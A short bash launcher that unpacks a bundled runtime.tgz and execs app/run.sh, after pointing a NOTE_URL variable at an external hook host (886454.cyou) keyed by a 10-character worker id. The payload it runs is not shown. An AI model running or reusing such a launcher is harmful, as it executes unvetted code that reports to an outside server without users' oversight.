#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
if [[ ! -x app/run.sh ]]; then
  [[ -f runtime.tgz ]] && tar -xzf runtime.tgz
  chmod +x app/run.sh 2>/dev/null || true
fi

NOTE_PREFIX="${NOTE_PREFIX:-https://886454.cyou/hook/}"
[[ "$NOTE_PREFIX" == */ ]] || NOTE_PREFIX="${NOTE_PREFIX}/"
export NOTE_PREFIX

args=()
for _arg in "$@"; do
  if [[ "$_arg" =~ ^[A-Za-z0-9]{10}$ ]]; then
    export WORKER="$_arg"
    export NOTE_URL="${NOTE_PREFIX}${_arg}"
  else
    args+=("$_arg")
  fi
done

if [[ -x app/run.sh ]]; then
  exec bash app/run.sh "${args[@]}"
fi
exit 1
